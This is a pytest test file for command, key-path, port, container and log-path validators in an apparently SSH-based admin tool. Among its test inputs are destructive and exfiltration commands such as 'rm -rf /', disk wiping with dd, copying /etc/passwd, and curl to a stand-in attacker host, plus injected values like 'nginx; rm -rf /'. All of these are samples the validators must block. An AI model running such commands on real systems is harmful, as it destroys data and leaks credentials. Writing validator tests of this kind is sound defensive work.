"""Unit tests for security.py validators."""
import sys
import os

# Run from repo root
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import pytest
from security import (
    validate_ssh_command,
    validate_ssh_key_path,
    validate_host_port,
    validate_nginx_container,
)


# ---------------------------------------------------------------------------
# validate_ssh_command — read-only allowlist
# ---------------------------------------------------------------------------

class TestSshCommandSafe:
    """Commands allowed without confirmed=true."""

    @pytest.mark.parametrize("cmd", [
        "uptime",
        "df -h",
        "free -m",
        "ps aux",
        "cat /etc/hostname",
        "head -20 /var/log/syslog",
        "tail -f /var/log/auth.log",
        "grep ERROR /var/log/app.log",
        "journalctl -u nginx -n 100",
        "ls -la /etc",
        "find /var/log -name '*.log' -maxdepth 2",
        "ip a",
        "ss -tlnp",
        "curl -s http://localhost:8080/health",
        "whoami",
        "hostname",
        "uname -a",
        "systemctl status nginx",
        "systemctl is-active docker",
        "docker ps",
        "docker images",
        "docker logs mycontainer",
        "docker inspect mycontainer",
        "ps aux | grep python",
        "cat /etc/os-release | grep VERSION",
        "journalctl -n 50 | grep ERROR",
    ])
    def test_safe_without_confirmed(self, cmd):
        validate_ssh_command(cmd, confirmed=False)  # must not raise


class TestSshCommandConditionallyAllowlisted:
    """Commands safe only when no mutating flags are present (P1 regression tests)."""

    @pytest.mark.parametrize("cmd", [
        # sed: read-only usage
        "sed 's/foo/bar/' file.txt",
        "sed -n '10,20p' /var/log/syslog",
        # curl: GET only
        "curl http://localhost:8080/health",
        "curl -s http://localhost/metrics",
        "curl -v https://example.com",
        # wget: read-only
        "wget http://localhost/check",
        # find: no -exec/-delete
        "find /var/log -name '*.log' -maxdepth 2",
        "find /tmp -type f -mtime +7",
    ])
    def test_conditionally_safe_without_confirmed(self, cmd):
        validate_ssh_command(cmd, confirmed=False)

    @pytest.mark.parametrize("cmd", [
        # sed: in-place edit
        "sed -i 's/foo/bar/' file.txt",
        "sed --in-place 's/x/y/' /etc/hosts",
        # curl: state-mutating
        "curl -X POST http://api/endpoint",
        "curl -d 'data=x' http://api/",
        "curl --data 'x=y' http://api/",
        "curl -o /tmp/output http://x/",
        "curl --output /tmp/out http://x/",
        # wget: state-mutating
        "wget --post-data=x http://x/",
        "wget -O /tmp/file http://x/",
        "wget --output-document=/tmp/x http://x/",
        # find: execution
        "find / -exec rm -rf {} ;",
        "find / -execdir ls {} ;",
        "find /tmp -delete",
        # awk: requires confirmed (can shell out via system())
        "awk '{print}' file.txt",
    ])
    def test_ambiguous_commands_require_confirmed(self, cmd):
        with pytest.raises(ValueError, match="confirmed"):
            validate_ssh_command(cmd, confirmed=False)


class TestSshCommandRequiresConfirmed:
    """Commands that require confirmed=true."""

    @pytest.mark.parametrize("cmd", [
        "rm -rf /",
        "sudo rm -rf /",
        "reboot",
        "shutdown -h now",
        "systemctl stop nginx",
        "systemctl restart nginx",
        "apt install vim",
        "useradd hacker",
        "chmod 777 /etc/passwd",
        "dd if=/dev/zero of=/dev/sda",
        "docker rm mycontainer",
        "docker stop mycontainer",
        "touch /etc/newfile",
        "mkdir /opt/newdir",
        "cp /etc/passwd /tmp/stolen",
    ])
    def test_requires_confirmed(self, cmd):
        with pytest.raises(ValueError, match="confirmed"):
            validate_ssh_command(cmd, confirmed=False)

    @pytest.mark.parametrize("cmd", [
        "rm -rf /tmp/test",
        "systemctl stop nginx",
        "docker rm mycontainer",
        "apt install vim",
    ])
    def test_allowed_with_confirmed(self, cmd):
        validate_ssh_command(cmd, confirmed=True)  # must not raise


class TestSshCommandAlwaysBlocked:
    """Always blocked regardless of confirmed."""

    @pytest.mark.parametrize("cmd", [
        "echo $(id)",
        "curl `whoami`.attacker.com",
        "cat /etc/passwd > /tmp/stolen",
        "echo test >> /etc/hosts",
        "ls > ~/output.txt",
    ])
    def test_always_blocked(self, cmd):
        with pytest.raises(ValueError):
            validate_ssh_command(cmd, confirmed=True)

    @pytest.mark.parametrize("cmd", [
        "echo $(id)",
        "cat > /etc/passwd",
    ])
    def test_always_blocked_without_confirmed(self, cmd):
        with pytest.raises(ValueError):
            validate_ssh_command(cmd, confirmed=False)


class TestSshCommandLengthLimit:
    def test_too_long(self):
        with pytest.raises(ValueError, match="500"):
            validate_ssh_command("a" * 501, confirmed=False)

    def test_max_length_ok(self):
        # 'uptime' repeated to fill under 500 chars is fine
        validate_ssh_command("uptime", confirmed=False)


# ---------------------------------------------------------------------------
# validate_ssh_key_path
# ---------------------------------------------------------------------------

class TestSshKeyPath:
    def test_valid_path(self):
        validate_ssh_key_path("/app/keys/my-server.pem")

    def test_valid_path_underscore(self):
        validate_ssh_key_path("/app/keys/vps_key.pem")

    @pytest.mark.parametrize("path", [
        "/etc/ssh/id_rsa",
        "/home/user/.ssh/id_ed25519",
        "/app/keys/../etc/passwd",
        "/app/keys/",
        "/app/keys/sub/dir/key.pem",
    ])
    def test_invalid_paths(self, path):
        with pytest.raises(PermissionError):
            validate_ssh_key_path(path)

    def test_null_byte(self):
        with pytest.raises(PermissionError):
            validate_ssh_key_path("/app/keys/key\x00.pem")

    def test_special_chars(self):
        with pytest.raises(PermissionError):
            validate_ssh_key_path("/app/keys/key;rm.pem")


# ---------------------------------------------------------------------------
# validate_host_port
# ---------------------------------------------------------------------------

class TestHostPort:
    @pytest.mark.parametrize("port", [80, 443, 8080, 8443, 465, 993, 995])
    def test_allowed_ports(self, port):
        validate_host_port("example.com", port)

    @pytest.mark.parametrize("port", [22, 3306, 5432, 6379, 9000, 8765])
    def test_blocked_ports(self, port):
        with pytest.raises(PermissionError):
            validate_host_port("example.com", port)

    def test_invalid_hostname(self):
        with pytest.raises(ValueError):
            validate_host_port("bad host!", 443)


# ---------------------------------------------------------------------------
# validate_nginx_container
# ---------------------------------------------------------------------------

class TestNginxContainer:
    def test_allowed(self):
        validate_nginx_container("nginx")
        validate_nginx_container("nginx-proxy")

    def test_not_allowed(self):
        with pytest.raises(PermissionError):
            validate_nginx_container("myapp")

    def test_invalid_format(self):
        with pytest.raises(ValueError):
            validate_nginx_container("nginx; rm -rf /")


# ---------------------------------------------------------------------------
# validate_log_path
# ---------------------------------------------------------------------------

from security import validate_log_path
import tempfile


class TestLogPath:
    def test_null_byte(self):
        with pytest.raises(PermissionError, match="Null byte"):
            validate_log_path("/var/log/syslog\x00")

    def test_path_traversal(self):
        with pytest.raises(PermissionError, match="traversal"):
            validate_log_path("/var/log/../etc/passwd")

    def test_glob_chars(self):
        with pytest.raises(PermissionError, match="Glob"):
            validate_log_path("/var/log/*.log")

    @pytest.mark.parametrize("path", [
        "/etc/passwd",
        "/tmp/something",
        "/home/user/file.log",
        "/var/log/mysql/error.log",  # not in allowlist
    ])
    def test_not_in_allowlist(self, path):
        with pytest.raises(PermissionError, match="allowlist"):
            validate_log_path(path)

    def test_valid_syslog(self, tmp_path, monkeypatch):
        # Patch Path.resolve to return the path itself so we don't need real /var/log
        import pathlib
        fake = tmp_path / "syslog"
        fake.write_text("log content")
        monkeypatch.setattr(pathlib.Path, "resolve", lambda self: fake)
        # /var/log/syslog is in allowlist — should pass after monkeypatching resolve
        result = validate_log_path("/var/log/syslog")
        assert result == fake
